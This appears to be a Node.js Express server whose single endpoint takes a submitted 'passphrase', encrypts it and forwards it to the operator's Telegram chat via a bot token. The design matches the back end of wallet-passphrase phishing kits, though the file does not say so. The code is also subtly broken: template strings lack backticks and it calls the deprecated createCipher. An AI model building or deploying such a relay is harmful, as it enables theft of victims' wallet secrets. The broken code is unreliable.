const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const app = express();
app.use(express.json());

const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
const YOUR_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
const SECRET_KEY = 'YOUR_SECRET_KEY'; // Used for encryption

// Encrypt the passphrase
function encryptPassphrase(passphrase) {
    const cipher = crypto.createCipher('aes-256-cbc', SECRET_KEY);
    let encrypted = cipher.update(passphrase, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

// Send encrypted passphrase to Telegram
app.post('/send-to-me', async (req, res) => {
    const { passphrase } = req.body;

    if (!passphrase) {
        return res.status(400).json({ error: 'Passphrase is required' });
    }

    try {
        // Encrypt the passphrase
        const encryptedPassphrase = encryptPassphrase(passphrase);

        // Send to your Telegram account
        await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
            chat_id: YOUR_CHAT_ID,
            text: Encrypted Passphrase: ${encryptedPassphrase},
        });

        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to send passphrase to Telegram' });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
